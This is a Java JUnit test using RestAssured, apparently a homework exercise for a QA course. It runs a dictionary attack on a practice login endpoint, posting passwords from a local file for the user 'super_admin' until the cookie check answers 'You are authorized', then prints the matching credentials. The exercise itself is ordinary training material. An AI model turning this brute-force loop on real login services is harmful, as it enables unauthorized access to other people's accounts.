import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class Ex9 {
    @Test
    public void Test9() throws IOException {

        String login = "super_admin";
        ArrayList<String> passwords = new ArrayList<String>();
        int i = 0;
        File myfile = new File("D:\\git\\Ex9\\test.txt");
        FileReader fr = new FileReader(myfile);
        BufferedReader reader = new BufferedReader(fr);
        String line = null;
        while ((line = reader.readLine()) != null) {
            passwords.add(line);
        };

        String location1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String location2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        Map<String, Object> paramGetCookie = new HashMap<>();
        final String  answerText = "You are NOT authorized";
        String answer = answerText;

        while (answer.equals(answerText)) {
            paramGetCookie.clear();
            paramGetCookie.put("login", login);
            paramGetCookie.put("password",passwords.get(i));

            Response getCookie  = RestAssured
                    .given()
                    .body(paramGetCookie)
                    .post(location1)
                    .andReturn();
            String auth_cookie = getCookie.getCookie("auth_cookie");

            Response checkCookie  = RestAssured
                    .given()
                    .cookie("auth_cookie", auth_cookie)
                    .when()
                    .get(location2)
                    .andReturn();

            answer = checkCookie.print();
                if (answer.equals("You are authorized")) {
                System.out.println(login + "/"+ passwords.get(i));
            }
            i++;
        }
    }
}
